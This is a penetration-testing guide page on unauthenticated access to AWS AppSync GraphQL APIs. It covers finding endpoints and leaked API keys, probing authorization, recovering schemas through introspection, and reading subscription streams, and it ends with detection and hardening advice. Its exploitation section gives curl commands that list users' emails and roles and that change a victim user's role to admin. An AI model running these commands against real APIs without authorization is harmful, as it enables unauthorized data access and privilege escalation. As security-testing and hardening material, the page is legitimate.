---
cstg_id: CSTG-AWS-APPSYNC-UNAUTH
title: "AWS Appsync - Unauthenticated Access"
provider: aws
service: appsync
phase: unauthenticated
required_access: unauthenticated
required_permissions: []
tools:
  - HTTP client (curl / HTTPie)
  - GraphQL introspection client
  - GraphQL IDE (in-browser query explorer)
  - WebSocket client
  - DNS / certificate transparency search
references:
  - https://docs.aws.amazon.com/appsync/latest/devguide/security-authz.html
  - https://docs.aws.amazon.com/appsync/latest/devguide/security_iam_id-based-policy-examples.html
  - https://docs.aws.amazon.com/appsync/latest/devguide/aws-appsync-real-time-data.html
  - https://graphql.org/learn/introspection/
  - https://owasp.org/www-project-web-security-testing-guide/
license: CC BY-SA 4.0
---

## Summary

AWS AppSync is a managed GraphQL (and Pub/Sub) service. Each AppSync API is exposed on an
internet-reachable HTTPS endpoint of the form
`https://<api-id>.appsync-api.<region>.amazonaws.com/graphql`, with a companion real-time
endpoint `wss://<api-id>.appsync-realtime-api.<region>.amazonaws.com/graphql` for
subscriptions. The data-plane endpoint is reachable by anyone on the internet; whether a
request succeeds depends entirely on the API's configured **authorization mode(s)**.

AppSync supports five authorization modes that can be combined on a single API:

- **API_KEY** — a static key passed in the `x-api-key` header. Keys are bearer credentials
  with no user context and a maximum lifetime of 365 days. Frequently treated as a "public"
  mode and embedded in mobile/JS clients.
- **AWS_IAM** — SigV4-signed requests tied to an IAM principal.
- **AMAZON_COGNITO_USER_POOLS** — JWT access/ID tokens from a Cognito user pool.
- **OPENID_CONNECT** — JWTs from any OIDC provider.
- **AWS_LAMBDA** — a custom Lambda authorizer returns an allow/deny decision.

From an unauthenticated, external perspective the high-value questions are: (1) can the
endpoint be reached at all, (2) does it accept an API key (and is one leaked or guessable in
client artefacts), (3) is GraphQL **introspection** enabled so the full schema can be
recovered, and (4) do field-level authorization rules actually restrict what an
API-key/unauthenticated caller can read or mutate. Misconfigured AppSync APIs routinely leak
their entire schema and permit unauthenticated reads and writes against backing DynamoDB
tables, RDS databases, Lambda resolvers, and HTTP data sources.

This page covers what an external party can determine and exercise **without valid
credentials**. For credentialed control-plane enumeration see
[AWS AppSync - Enumeration](../02-services/aws-appsync-enum.md); for abusing AppSync
permissions to escalate see
[AWS AppSync - Privilege Escalation](../03-privilege-escalation/aws-appsync-privesc.md).

## Prerequisites

- Network egress to `*.amazonaws.com` over HTTPS/WSS (no AWS account required).
- An AppSync API identifier or endpoint. These appear in:
  - Mobile app bundles, single-page-app JavaScript, source maps, and configuration files
    (`aws-exports.js`, `amplifyconfiguration.json`, `awsconfiguration.json`).
  - Certificate transparency logs and passive DNS for `*.appsync-api.*.amazonaws.com`.
  - CORS/`Access-Control-Allow-Origin` reflections and error responses on partner sites.
- Optionally a leaked **API key** (`da2-...`) discovered in any of the artefacts above.

## Enumeration

### Discover endpoints and keys from client artefacts

Amplify-generated configuration is the richest source. Look for the GraphQL endpoint, region,
default authorization type, and — critically — an embedded API key:

```jsonc
// amplifyconfiguration.json (excerpt)
{
  "aws_appsync_graphqlEndpoint": "https://abcd1234efgh.appsync-api.us-east-1.amazonaws.com/graphql",
  "aws_appsync_region": "us-east-1",
  "aws_appsync_authenticationType": "API_KEY",
  "aws_appsync_apiKey": "da2-examplekeyexamplekey00"
}
```

Search downloaded bundles and repositories for the telltale strings:

```bash
grep -rEi 'appsync-(api|realtime-api)\.[a-z0-9-]+\.amazonaws\.com' ./client/
grep -rEo 'da2-[a-z0-9]{26}' ./client/        # API_KEY format
grep -rEi 'aws_appsync_(graphqlEndpoint|apiKey|authenticationType)' ./client/
```

Certificate transparency and passive DNS can reveal API IDs even without a client:

```bash
curl -s 'https://crt.sh/?q=%25.appsync-api.%25.amazonaws.com&output=json' | jq -r '.[].name_value' | sort -u
```

### Probe the endpoint and authorization mode

A bare unauthenticated POST reveals which authorization mode the API expects. AppSync returns
distinctive errors:

```bash
ENDPOINT='https://abcd1234efgh.appsync-api.us-east-1.amazonaws.com/graphql'

# No auth at all
curl -s -X POST "$ENDPOINT" \
  -H 'Content-Type: application/json' \
  -d '{"query":"query{__typename}"}'
```

- `{"errors":[{"errorType":"UnauthorizedException","message":"You are not authorized to make this call."}]}`
  → IAM/Cognito/OIDC/Lambda auth required; an API key was not accepted or not configured.
- `{"errors":[{"errorType":"BadRequestException","message":"Missing authentication token."}]}`
  → an authorization header/key is required.
- A `200` with data → the API permits truly unauthenticated calls (rare, but possible via a
  permissive Lambda authorizer or misconfigured IAM).

If an API key was recovered, replay with it:

```bash
curl -s -X POST "$ENDPOINT" \
  -H 'Content-Type: application/json' \
  -H 'x-api-key: da2-examplekeyexamplekey00' \
  -d '{"query":"query{__typename}"}'
```

A `200` confirms the key is live and the API_KEY mode is enabled.

### Schema recovery via introspection

If introspection is enabled, the entire schema — every type, field, query, mutation, and
subscription — can be pulled with a standard introspection query. This is the single most
valuable piece of reconnaissance because it maps the whole attack surface.

```bash
curl -s -X POST "$ENDPOINT" \
  -H 'Content-Type: application/json' \
  -H 'x-api-key: da2-examplekeyexamplekey00' \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { kind name fields(includeDeprecated:true){ name args{ name type{ kind name ofType{ kind name } } } type{ kind name ofType{ kind name } } } } } }"}' | jq .
```

The standard full introspection query (as emitted by GraphQL IDEs and introspection clients)
should be used to capture directives, enums, input objects, and interfaces as well. Save the
result and reconstruct the SDL to plan queries and mutations offline.

If introspection is disabled, fall back to **field suggestion** probing — GraphQL servers
often return "Did you mean ...?" hints, and AppSync error messages on malformed queries can
leak valid field names. Names recovered from the client artefacts (operation strings,
`gql\`...\`` tags) are equally useful for blind querying.

### Real-time / subscription endpoint

Subscriptions ride a WebSocket protocol on the `appsync-realtime-api` host. The connection
handshake carries the same authorization material (API key or token), base64-encoded in the
`header` query-string parameter, with subprotocol `graphql-ws`. An unauthenticated tester who
holds a valid API key can subscribe to mutation streams and passively observe data written by
*other* users in real time — a common and high-impact data-leak path when subscription
authorization is not scoped per-user.

## Misconfigurations & Findings

- **Introspection enabled on a production API.** Full schema disclosure. AppSync has no
  native toggle to disable introspection on the standard data endpoint; teams that want it off
  must front the API or rely on field-level auth. Treat an introspectable production API as a
  finding in its own right.
- **API_KEY used as the primary/default auth mode for sensitive data.** API keys are static,
  unscoped bearer tokens with no user identity. Any query or mutation reachable under API_KEY
  is effectively public to anyone who obtains the key.
- **Leaked / long-lived API keys.** Keys embedded in client bundles, committed to source
  control, or issued with the maximum 365-day expiry. A live key grants whatever the API_KEY
  mode allows.
- **Missing field-level authorization.** Even with Cognito/OIDC configured, individual
  fields can be additionally annotated `@aws_api_key` (or left open under a permissive mode),
  unintentionally exposing specific queries/mutations to unauthenticated/API-key callers.
- **Over-broad resolvers.** Resolvers that map directly to a DynamoDB `Scan`, an unscoped SQL
  query, or an HTTP data source without injecting the caller's identity allow an API-key
  caller to read or modify all records, not just their own.
- **Subscriptions not scoped per principal.** Any holder of a valid API key receives all
  published events, leaking other users' data in real time.
- **Verbose errors.** Resolver/data-source errors echoed to the client reveal table names,
  SQL fragments, Lambda ARNs, and stack details.
- **Permissive CORS** allowing the GraphQL endpoint to be called from arbitrary origins,
  enabling cross-site data theft when combined with a usable auth mode.

## Exploitation

Exploitation from an unauthenticated position depends on a usable authorization mode — almost
always a live API key or a genuinely open Lambda authorizer.

With a confirmed key and the schema in hand, enumerate and exercise every operation:

```bash
# List queries/mutations/subscriptions from the recovered schema, then run reads:
curl -s -X POST "$ENDPOINT" \
  -H 'Content-Type: application/json' -H 'x-api-key: da2-...' \
  -d '{"query":"query { listUsers { items { id email role } } }"}' | jq .

# Attempt mutations that may be unintentionally exposed:
curl -s -X POST "$ENDPOINT" \
  -H 'Content-Type: application/json' -H 'x-api-key: da2-...' \
  -d '{"query":"mutation { updateUser(input:{id:\"victim\", role:\"admin\"}) { id role } }"}' | jq .
```

Common unauthenticated/API-key impacts:

- **Bulk data exfiltration** through list/scan-backed queries (DynamoDB `Scan`, unscoped SQL).
- **Authorization bypass / IDOR** by supplying another user's identifier where the resolver
  trusts client-supplied keys instead of the authenticated subject.
- **Unauthorized mutations** (privilege fields like `role`/`isAdmin`, balance/credit fields,
  status flags) where mutations lack field-level auth.
- **Injection into backing stores** — resolver mapping templates that interpolate raw input
  into DynamoDB conditions, SQL statements (RDS Data API), or downstream HTTP requests can be
  abused for NoSQL/SQL/SSRF-style attacks; test input fields for injection.
- **Real-time data harvesting** by subscribing to mutation events on the WebSocket endpoint.

Always confirm scope/authorization-to-test before exercising mutations against a live target.

## Detection & Logging

- **AppSync request logging** to CloudWatch Logs (when enabled at `ERROR` or `ALL` level)
  records request IDs, resolver execution, and auth failures. A spike in
  `UnauthorizedException` / introspection-shaped queries indicates probing.
- **CloudTrail** captures AppSync **control-plane** events (`CreateApiKey`, `UpdateGraphqlApi`,
  `CreateResolver`, etc.) but does **not** record individual GraphQL data-plane queries; rely
  on AppSync CloudWatch request logs and WAF logs for data-plane visibility.
- **AWS WAF** associated with the AppSync API logs every request and can flag introspection
  queries, high request rates, and known scanner signatures.
- Indicators: requests containing `__schema`/`IntrospectionQuery`, large `listX`/scan
  responses, mutations from anonymous/API-key context, and WebSocket subscribe storms.

## Remediation & Hardening

- **Do not use API_KEY for non-public data.** Prefer Cognito User Pools, OIDC, IAM, or a
  Lambda authorizer that enforces real identity. If API keys are required, scope them tightly
  and rotate frequently with short expiries.
- **Apply field-level authorization.** Annotate types and fields with the minimum auth
  directives (`@aws_cognito_user_pools`, `@aws_iam`, `@aws_oidc`, `@aws_auth(cognito_groups:)`)
  rather than relying on the API default. Never leave sensitive mutations under `@aws_api_key`.
- **Disable/neutralise introspection in production** by fronting the API with WAF rules that
  block `__schema`/`__type` introspection queries, or by gating the endpoint behind authenticated
  modes only.
- **Scope resolvers to the caller's identity.** Use `$context.identity` to constrain
  DynamoDB keys and SQL/HTTP requests so a caller can only access their own records; never
  trust client-supplied owner IDs.
- **Sanitise errors.** Disable verbose error propagation; do not echo data-source internals.
- **Front with WAF** for rate limiting, introspection blocking, and bot controls.
- **Restrict CORS** to trusted origins.
- **Scope subscriptions per principal** so published events are only delivered to authorized
  subscribers.
- Enable AppSync request logging and WAF logging; alert on auth-failure spikes and
  introspection.

## Tools

- HTTP client (curl / HTTPie) for raw GraphQL POSTs and key replay.
- GraphQL introspection client / in-browser query explorer for schema recovery and query building.
- WebSocket client for exercising the real-time subscription endpoint.
- DNS / certificate-transparency search for endpoint discovery.
- Secret/credential scanners over client bundles and repositories for leaked API keys.

## References

- AWS AppSync — Authorization and authentication: https://docs.aws.amazon.com/appsync/latest/devguide/security-authz.html
- AWS AppSync — IAM identity-based policy examples: https://docs.aws.amazon.com/appsync/latest/devguide/security_iam_id-based-policy-examples.html
- AWS AppSync — Real-time data (subscriptions/WebSocket protocol): https://docs.aws.amazon.com/appsync/latest/devguide/aws-appsync-real-time-data.html
- GraphQL — Introspection: https://graphql.org/learn/introspection/
- OWASP Web Security Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
